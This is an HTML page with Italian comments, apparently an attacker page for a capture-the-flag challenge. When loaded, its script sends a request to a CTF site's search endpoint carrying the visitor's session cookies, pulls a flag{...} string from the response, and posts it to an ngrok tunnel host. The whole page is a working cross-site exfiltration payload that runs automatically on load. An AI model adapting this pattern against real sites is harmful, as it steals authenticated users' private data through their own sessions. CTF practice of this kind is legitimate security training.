<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rubare Flag</title>
</head>
<body>
    <h1>Rubare la Flag dell'Architetto</h1>

    <script>
        // Funzione per rubare la flag
        const stealFlag = () => {
            fetch('https://matrix-simplified.capturetheflags.site/search?s=flag', {
                method: 'GET',
                credentials: 'include', // Include i cookie di sessione
                mode: 'cors' // Imposta CORS
            })
            .then(response => {
                if (!response.ok) {
                    // Aggiungi un messaggio di errore dettagliato
                    throw new Error('Network response was not ok: ' + response.status + ' ' + response.statusText);
                }
                return response.text();
            })
            .then(data => {
                const flag = data.match(/flag{.*?}/);
                if (flag) {
                    fetch('https://1e6b-87-4-142-72.ngrok-free.app/receive_flag', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: `flag=${encodeURIComponent(flag[0])}`
                    })
                    .then(response => response.text())
                    .then(data => console.log(data))
                    .catch(error => console.error('Errore nella ricezione della flag:', error));
                } else {
                    console.log('Nessuna flag trovata nella risposta.');
                }
            })
            .catch(error => console.error('Errore:', error));
        };


        // Eseguire automaticamente la funzione al caricamento della pagina
        window.onload = stealFlag;
    </script>
</body>
</html>
